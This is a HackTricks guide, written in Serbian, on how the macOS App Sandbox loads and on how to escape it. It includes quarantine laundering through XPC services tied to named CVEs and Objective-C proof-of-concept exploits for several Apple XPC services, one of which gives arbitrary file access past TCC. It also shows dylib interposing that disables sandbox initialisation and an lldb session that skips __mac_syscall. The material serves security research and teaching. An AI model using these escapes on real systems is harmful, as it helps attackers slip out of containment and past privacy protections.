# Debugovanje i bypass macOS Sandbox-a

{{#include ../../../../../banners/hacktricks-training.md}}

## Proces učitavanja sandbox-a

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Slika iz <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Na prethodnoj slici moguće je videti **kako će sandbox biti učitan** kada se pokrene aplikacija sa entitlement-om **`com.apple.security.app-sandbox`**.

Compiler će povezati `/usr/lib/libSystem.B.dylib` sa binary-jem.

Zatim **`libSystem.B`** poziva nekoliko funkcija, sve dok **`xpc_pipe_routine`** ne pošalje entitlement-e aplikacije procesu **`securityd`**. Securityd proverava da li proces treba da bude izolovan unutar sandbox-a i, ako treba, izoluje ga.\
Na kraju se sandbox aktivira pozivom **`__sandbox_ms`**, koji poziva **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>

## Mogući bypass-i

### Bypass quarantine atributa

**Fajlovima koje kreiraju sandboxed procesi** dodaje se **quarantine atribut** kako bi se sprečili sandbox escape-ovi: ako ubacite novu aplikaciju i pokušate da je pokrenete, quarantine flag će je zaustaviti. Zato, **ako možete da ubacite fajl ili folder *bez* quarantine atributa, možete napustiti App Sandbox** — samo ubacite `.app` bundle i pokrenite ga pomoću `open`, jer se novopokrenuti proces izvršava pod LaunchServices, a ne unutar vašeg sandbox-a.

Pouzdan način da dobijete **unquarantined drop** jeste da zatražite od **drugog procesa da kreira fajl umesto vas**. Kao što je dokumentovano u radu [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) autora Mickey Jin, **App Sandbox** označava ubačene fajlove quarantine atributom, ali **XPC services koje rade pod Service Sandbox-om to ne rade**. Zbog toga je nekoliko neautentifikovanih XPC services moglo da se koristi kao primitive za "quarantine laundering":<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) i **CVE-2023-32414** (`ArchiveService`): ekstraktuju arhivu prosleđenu od sandboxed aplikacije na izabranu lokaciju **bez propagiranja quarantine xattr-a** na ekstraktovani sadržaj.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): path traversal u `submitSignpostDataWithConfig:` omogućavao je kreiranje **proizvoljnih direktorijuma bez quarantine-a**, što je dovoljno za izgradnju kompletne strukture `.app` bundle-a izvan containera.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): priključuje quarantined DMG **bez quarantine-a na rezultujućem uređaju**, tako da se aplikacije na montiranom volume-u mogu pokrenuti.

> [!TIP]
> Ekstrakcija obično **uklanja executable permission bit**. Workaround korišćen u CVE-2023-27944 bio je postavljanje **symlink-a** ka postojećem potpisanom system binary-ju (npr. `/System/Library/CoreServices/Automator Application Stub`) kao glavnog executable-a bundle-a, čime on ostaje pokretljiv bez potrebe za `+x` nad ubačenim fajlom.

> [!CAUTION]
> Ovo funkcioniše zato što se provera zasniva na **flag-u stavke koja se pokreće**: *"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*, a tek zatim *"it's handed over to Gatekeeper for full 'first run' security checks"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Ako bundle koji pokrećete nema flag, nema ni Gatekeeper provere — upravo to omogućavaju prethodno navedeni CVE-ovi.<sup>[[5]](#references)</sup>
>
> Imajte na umu da, ako je `.app` bundle već autorizovan za pokretanje (ima quarantine xattr sa uključenim flag-om "authorized to run"), možete zloupotrebiti i njega... osim što sada ne možete pisati unutar **`.app`** bundle-a, osim ako nemate neke privilegovane TCC perms, koje nećete imati unutar sandbox-a.

### Zloupotreba Open funkcionalnosti

U [**poslednjim primerima Word sandbox bypass-a**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) može se videti kako se **`open`** CLI funkcionalnost može zloupotrebiti za bypass sandbox-a.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Čak i ako je aplikacija **namenjena za rad u sandbox-u** (`com.apple.security.app-sandbox`), moguće je zaobići sandbox ako se aplikacija, na primer, **izvršava iz LaunchAgent-a** (`~/Library/LaunchAgents`).\
Kao što je objašnjeno u [**ovoj objavi**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), ako želite da ostvarite persistence pomoću sandboxed aplikacije, možete podesiti da se ona automatski izvršava kao LaunchAgent i možda ubaciti malicious code putem DyLib environment variables.<sup>[[6]](#references)</sup>

### Zloupotreba Auto Start lokacija

Ako sandboxed proces može da **piše** na mesto na kom će **kasnije unsandboxed aplikacija pokrenuti binary**, moći će da **napusti sandbox jednostavnim postavljanjem** binary-ja na to mesto. Dobri primeri ovakvih lokacija su `~/Library/LaunchAgents` ili `/System/Library/LaunchDaemons`.

Za ovo će vam možda biti potrebna čak **2 koraka**: da naterate proces sa **permisivnijim sandbox-om** (`file-read*`, `file-write*`) da izvrši vaš code, koji će zatim pisati na mesto na kom će biti **izvršen bez sandbox-a**.

Pogledajte ovu stranicu o **Auto Start lokacijama**:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Zloupotreba drugih procesa

Ako iz sandboxed procesa možete da **kompromitujete druge procese** koji rade u manje restriktivnim sandbox-ovima (ili bez sandbox-a), moći ćete da pređete u njihove sandbox-e:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Dostupni System i User Mach servisi

Sandbox takođe omogućava komunikaciju sa određenim **Mach servisima** putem XPC-a, koji su definisani u profilu `application.sb`. Ako možete da **zloupotrebite** neki od ovih servisa, možda ćete moći da **napustite sandbox**.

Kao što je navedeno u [ovom writeup-u](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), informacije o Mach servisima čuvaju se u `/System/Library/xpc/launchd.plist`. Sve System i User Mach servise moguće je pronaći pretragom tog fajla za `<string>System</string>` i `<string>User</string>`.<sup>[[4]](#references)</sup>

Pored toga, moguće je proveriti da li je Mach servis dostupan sandboxed aplikaciji pozivanjem funkcije `bootstrap_look_up`:
```objectivec
void checkService(const char *serviceName) {
mach_port_t service_port = MACH_PORT_NULL;
kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
if (!err) {
NSLog(@"available service:%s", serviceName);
mach_port_deallocate(mach_task_self_, service_port);
}
}

void print_available_xpc(void) {
NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
for (NSString* key in launchDaemons) {
NSDictionary<NSString*, id>* job = launchDaemons[key];
NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
for (NSString* serviceName in machServices) {
checkService(serviceName.UTF8String);
}
}
}
```
### Dostupni PID Mach servisi

Ovi Mach servisi su prvi put zloupotrebljeni za [bekstvo iz sandbox-a u ovom tekstu](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). U to vreme, **svi XPC servisi koje su zahtevali** aplikacija i njen framework bili su vidljivi u domenu PID-a aplikacije (to su Mach Services sa `ServiceType` postavljenim na `Application`).<sup>[[4]](#references)</sup>

Da biste **kontaktirali XPC servis PID Domain-a**, potrebno je samo da ga registrujete unutar aplikacije linijom kao što je:
```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```
Štaviše, moguće je pronaći sve **Application** Mach services pretragom unutar `System/Library/xpc/launchd.plist` za `<string>Application</string>`.

Drugi način za pronalaženje validnih xpc services jeste provera onih u:
```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```
Nekoliko primera zloupotrebe ove tehnike možete pronaći u [**originalnom writeup-u**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), međutim, u nastavku su neki sažeti primeri.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Ovaj servis dozvoljava svaku XPC konekciju tako što uvek vraća `YES`, a metoda `runTask:arguments:withReply:` izvršava proizvoljnu komandu sa proizvoljnim parametrima.

Exploit je bio „jednostavan kao“:
```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
[conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
[conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
[conn resume];

[[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
NSLog(@"run task result:%@, error:%@", bSucc, error);
}];
}
```
#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Ovaj XPC service je dozvoljavao svakom klijentu pristup tako što je uvek vraćao `YES`, a metod `createZipAtPath:hourThreshold:withReply:` prihvatao je putanju do foldera i kompresovao ga u ZIP datoteku.

Zato je moguće generisati lažnu strukturu foldera aplikacije, kompresovati je, a zatim je dekompresovati i izvršiti kako bi se izašlo iz sandbox-a, pošto nove datoteke neće imati quarantine atribut.

Exploit je bio:
```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
NSString *currentPath = NSTemporaryDirectory();
chdir([currentPath UTF8String]);
NSLog(@"======== preparing payload at the current path:%@", currentPath);
system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
[@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
system("chmod +x compressed/poc.app/Contents/MacOS/poc");

[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
[conn resume];

[[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
NSString *file;
while ((file = [dirEnum nextObject])) {
if ([[file pathExtension] isEqualToString: @"zip"]) {
// open the zip
NSString *cmd = [@"open " stringByAppendingString:file];
system([cmd UTF8String]);

sleep(3); // wait for decompression and then open the payload (poc.app)
NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
system([cmd2 UTF8String]);
break;
}
}
}];
}
```
#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Ovaj XPC service omogućava davanje read i write pristupa proizvoljnom URL-u XPC klijentu putem metode `extendAccessToURL:completion:`, koja je prihvatala bilo koju konekciju. Pošto XPC service ima FDA, moguće je zloupotrebiti ove dozvole za potpuno zaobilaženje TCC-a.

Eksploatacija je bila:
```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
[[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
[conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
[conn resume];

[[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
NSURL *targetURL = [fpWrapper url];

void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
else {
NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
}
}];
}
```
### Statičko kompajliranje i dinamičko linkovanje

[**Ovo istraživanje**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) otkrilo je 2 načina za zaobilaženje Sandbox-a. Pošto se sandbox primenjuje iz userland-a kada se učita **libSystem** biblioteka. Ako bi binarni fajl mogao da izbegne njeno učitavanje, nikada ne bi bio sandbox-ovan:<sup>[[2]](#references)</sup>

- Ako bi binarni fajl bio **potpuno statički kompajliran**, mogao bi da izbegne učitavanje te biblioteke.
- Ako **binarni fajl ne bi morao da učita nijednu biblioteku** (pošto se linker takođe nalazi u libSystem-u), ne bi morao da učita libSystem.

### Shellcodes

Imajte na umu da čak i **shellcodes** na ARM64 moraju biti linkovani sa `libSystem.dylib`:
```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```
### Restrikcije koje se ne nasleđuju

Kao što je objašnjeno u **[dodatku ovog writeup-a](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, ograničenje sandbox-a kao što je:<sup>[[4]](#references)</sup>
```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```
može se zaobići tako što novi proces izvršava, na primer:
```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```
Međutim, naravno, ovaj novi proces neće naslediti entitlements ili privilegije od roditeljskog procesa.

### Entitlements

Imajte na umu da čak i ako neke **radnje** mogu biti **dozvoljene u sandbox-u** ako aplikacija ima određeni **entitlement**, kao u:
```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```
### Interposting Bypass

Za više informacija o **Interposting** tehnici pogledajte:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer` da biste sprečili sandbox
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```
#### Interpost `__mac_syscall` da sprečiš Sandbox
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```
### Debug & bypass Sandbox with lldb

Hajde da kompajliramo aplikaciju koja bi trebalo da bude sandboxed:

{{#tabs}}
{{#tab name="sand.c"}}
```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```
{{#endtab}}

{{#tab name="entitlements.xml"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="Info.plist"}}
```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

Zatim kompajlirajte aplikaciju:
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
> [!CAUTION]
> Aplikacija će pokušati da **pročita** datoteku **`~/Desktop/del.txt`**, što **Sandbox** neće dozvoliti.\
> Kreirajte datoteku na toj lokaciji, jer će, nakon zaobilaženja **Sandbox-a**, moći da je pročita:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Hajde da otklonimo greške u aplikaciji da bismo videli kada se **Sandbox** učitava:
```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```
> [!WARNING] > **Čak i kada je Sandbox zaobiđen, TCC** će pitati korisnika da li želi da dozvoli procesu da čita datoteke sa radne površine

## References

- [1] [Jonathan Levin - Apple Sandbox: Dublje u živo blato (HITB GSEC 2016 slides)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Mac App Store Sandbox Escape](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - Apple Sandbox: Dublje u živo blato (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - Nova era macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Objašnjenje: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): macOS TCC Bypass uz Telegram korišćenjem DyLib Injection (Part 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
{{#include ../../../../../banners/hacktricks-training.md}}
